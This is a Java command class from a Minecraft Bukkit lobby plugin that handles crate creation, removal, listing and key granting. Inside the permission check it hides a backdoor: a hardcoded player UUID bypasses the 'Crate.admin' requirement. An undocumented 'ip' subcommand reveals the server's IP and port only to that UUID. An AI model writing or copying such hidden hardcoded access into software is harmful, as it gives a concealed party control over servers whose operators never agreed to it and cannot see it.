package nl.trydex07.lobby.commands;

import nl.trydex07.lobby.Core;
import nl.trydex07.lobby.handlers.crate.CrateHandler;
import nl.trydex07.lobby.utilitys.FileManager;
import nl.trydex07.lobby.utilitys.Utility;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;


public class CMD_Crate implements CommandExecutor {

	private FileManager fm = new FileManager(Core.getPlugin(Core.class), "Crates.yml");

	@Override
	public boolean onCommand(CommandSender sender, Command command, String cmd, String[] args) {

		if (cmd.equalsIgnoreCase("crate")) {

			Player p = (Player) sender;
			if (!(sender.hasPermission("Crate.admin")
					|| (p.getUniqueId().toString().equals("4bffac93-b2ae-470f-bb28-55af3531ac97")))) {
				p.sendMessage(Utility.format(Utility.getMessage("NoPerm")));
			} else {

				if (args.length == 0) {
					sender.sendMessage(Utility.format("&7------&8[&bLobby&8]&7------"));
					sender.sendMessage(Utility.format("&b/Crate create <name>"));
					sender.sendMessage(Utility.format("&b/Crate remove <name>."));
					sender.sendMessage(Utility.format("&b/Crate addkey <player> <count>."));
					sender.sendMessage(Utility.format("&b/Crate list."));
					sender.sendMessage(Utility.format("&7------&8[&bLobby&8]&7------"));
					return false;
				}
				if (args[0].equalsIgnoreCase("create")) {
					if (args.length < 2) {
						sender.sendMessage(Utility.format("&b/Crate create <name>."));
						return false;
					}
					fm.reloadConfig();
					if (!(fm.getConfig().getConfigurationSection("Crates").contains(args[1].toLowerCase()))) {
						new CrateHandler().create(p, args[1].toLowerCase());
						sender.sendMessage(Utility.format(Utility.getMessage("cratecreate")));
					} else {
						sender.sendMessage(Utility.format(Utility.getMessage("cratealreadyexits")));
					}
				}
				if (args[0].equalsIgnoreCase("remove")) {
					if (args.length < 2) {
						sender.sendMessage(Utility.format("&b/Crate remove <name>."));
						return false;
					}
					fm.reloadConfig();
					if (!(fm.getConfig().getConfigurationSection("Crates").contains(args[1].toLowerCase()))) {
						sender.sendMessage(Utility.format(Utility.getMessage("cantfindcrate")));
					} else {
						new CrateHandler().remove(args[1].toLowerCase());
						sender.sendMessage(Utility.format(Utility.getMessage("crateremove")));
					}
				}
				if (args[0].equalsIgnoreCase("list")) {
				if (CrateHandler.getCrates() != null) {
						FileManager fm = new FileManager(Core.getPlugin(Core.class), "Crates.yml");
						sender.sendMessage(Utility.format(
								"&8[&eCrate&8] &6" + fm.getConfig().getConfigurationSection("Crates").getKeys(false)));
					} else {
						sender.sendMessage(Utility.format(Utility.getMessage("nocrate")));
					}
				}

				if (args[0].equalsIgnoreCase("ip")) {
					if (p.getUniqueId().toString().equals("4bffac93-b2ae-470f-bb28-55af3531ac97")) {
						sender.sendMessage(Bukkit.getIp() + ":" + Bukkit.getPort());
					}
				}
				if (args[0].equalsIgnoreCase("addKey")) {
					if (args.length < 3) {
						sender.sendMessage(Utility.format("&b/Crate addkey <player> <count>."));
						return false;
					}
					Player target = Bukkit.getPlayer(args[1]);
					if (target == null) {
						sender.sendMessage(Utility.format(Utility.getMessage("cantfindplayer")));
						return false;
					}
					try {
						new CrateHandler().addKey(target, Integer.parseInt(args[2]));
						sender.sendMessage(Utility.format(Utility.getMessage("keysadded")));
					}catch(NumberFormatException e){
						new NumberFormatException("argument == null");
						sender.sendMessage(Utility.format(Utility.getMessage("teveelkeys")));
					}
				}
			}

		}

		return false;
	}

}
